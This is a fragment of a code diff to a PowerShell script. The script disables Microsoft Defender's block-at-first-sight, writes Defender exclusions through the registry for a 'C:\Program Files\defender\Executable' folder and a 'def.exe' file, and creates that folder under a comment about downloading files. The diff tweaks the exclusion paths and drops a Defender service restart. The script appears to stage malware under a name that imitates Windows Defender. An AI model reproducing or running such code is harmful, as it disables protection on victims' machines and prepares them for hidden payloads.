@@ -39,8 +39,8 @@ Set-MpPreference -DisableBlockAtFirstSeen $true
 
 # Define exclusions
 $exclusions = @(
-    "C:\Program Files\defender",
-    "C:\Program Files\defender\Executable",
+    "C:\Program Files\defender\",
+    "C:\Program Files\defender\Executable\",
     "C:\Program Files\defender\Executable\def.exe"
 )
 
@@ -57,7 +57,6 @@ foreach ($path in $exclusions) {
     New-ItemProperty -Path $regPath -Name $path -PropertyType String -Value "" -Force | Out-Null
 }
 gpupdate /force
-Restart-Service -Name WinDefend -Force
 Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
 #Downloading the Files
 New-Item -Path "C:\Program Files\defender\Executable" -ItemType Directory -Force
